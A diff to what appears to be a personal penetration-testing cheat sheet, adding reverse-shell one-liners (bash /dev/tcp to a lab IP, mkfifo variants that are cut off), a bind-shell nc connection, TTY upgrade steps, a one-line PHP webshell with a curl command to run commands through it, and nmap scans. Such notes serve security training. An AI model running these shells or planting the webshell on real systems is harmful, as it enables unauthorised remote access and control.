@@ -149,7 +149,23 @@ Download and install a package
 * Setup Reverse Shell
 > c -lvnp 1234	Start a nc listener on a local port
 
-> bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'	Send a reverse shell from the remote server
+* Send a reverse shell from the remote server
+> bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'	
+> `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f 	/bin/sh -i 2>&1
+> `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f 	/bin/bash -i 2>&1
+
+* Connect to a bind shell started on the remote server
+> nc 10.10.10.1 1234 	
+
+* Upgrade shell TTY (1 or 2)
+> python -c 'import pty; pty.spawn("/bin/bash")' 	Upgrade shell TTY (1)
+> ctrl+z then stty raw -echo then fg then enter twice 	Upgrade shell TTY (2)
+
+*	Create a webshell php file
+> echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php 
+
+* Execute a command on an uploaded webshell
+> curl http://SERVER_IP:PORT/shell.php?cmd=id 	
 
 * Privilege Escalation 	
 > ./linpeas.sh 	Run linpeas script to enumerate remote server
@@ -266,29 +282,6 @@ Get-Service	PowerShell cmdlet to view running services
   
   
 
-* list
-  * list
-
-1. list 
-2. list 
-
-> Blockquote
-> 
-`<addr>` inline clode
-
-```javascript
-function fancyAlert(arg) {
-  if(arg) {
-    $.facebox({div:'#foo'})
-  }
-}
-```
-
-
-- [x] this is a complete item
-- [ ] this is an incomplete item
-
-
 * NEW
 netstat -rn
 ssh user@10.10.10.10
@@ -298,8 +291,7 @@ netcat 10.10.10.10 22
 
 
 
-
- Service Enumeration
+## Service Enumeration
 nmap -sV -sC -p- 10.129.42.253
 nmap -sV -sC -p- 10.129.42.253 	Run an nmap script scan on an IP
 locate scripts/citrix 	List various available nmap scripts
